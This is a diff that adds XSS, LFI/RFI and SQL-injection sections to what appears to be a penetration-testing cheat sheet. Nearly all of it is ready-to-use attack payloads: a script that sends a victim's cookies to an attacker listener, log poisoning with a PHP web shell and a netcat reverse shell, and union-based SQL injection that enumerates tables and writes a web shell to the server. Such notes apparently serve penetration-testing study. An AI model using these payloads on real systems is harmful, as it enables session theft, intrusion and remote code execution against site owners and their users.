@@ -273,6 +273,42 @@ On victim machine:
 
 	Paste the content of <[FILE.txt]>
 	
+# XSS
+
+<b>Stole cookie from xss:</b>
+	
+	On attacker machine set listener (nc -nlvp <[PORT]>)
+	
+	On victim website <script>new Image().src="http://<[IP]>:<[PORT]>/test.php?output="+document.cookie;</script>
+
+# LFI/RFI
+
+	Connect via netcat to victim (nc -nv <[IP]> <[PORT]>) and send <?php echo shell_exec($_GET['cmd']);?>, after that try to include log file for code execution.
+
+	&cmd=nc -nv <[IP]> <[PORT]> -e cmd.exe&LANG=../../../../../../../xampp/apache/logs/access.log%00
+	
+# SQL Injection
+
+<b>Bse:</b>
+
+	any' or 1=1 limit 1;-- 
+
+<b>Number of columns:</b>
+	
+	order by 1, order by 2, ...
+
+<b>Expose data from database:</b>
+	
+	UNION select 1,2,3,4,5,6
+
+<b>Enum tables:</b>
+
+	UNION select 1,2,3,4,table_name,6 FROM information_schema.tables
+
+<b>Shell upload:</b>
+
+	<[IP]>:<[PORT]>/<[URL]>.php?<[PARAMETER]>=999 union select 1,2,"<?php echo shell_exec($_GET['cmd']);?>",4,5,6 into OUTFILE '/var/www/html/evil.php'
+	
 # Privilege Escalation
 
 <b>Vulnerable Services</b>
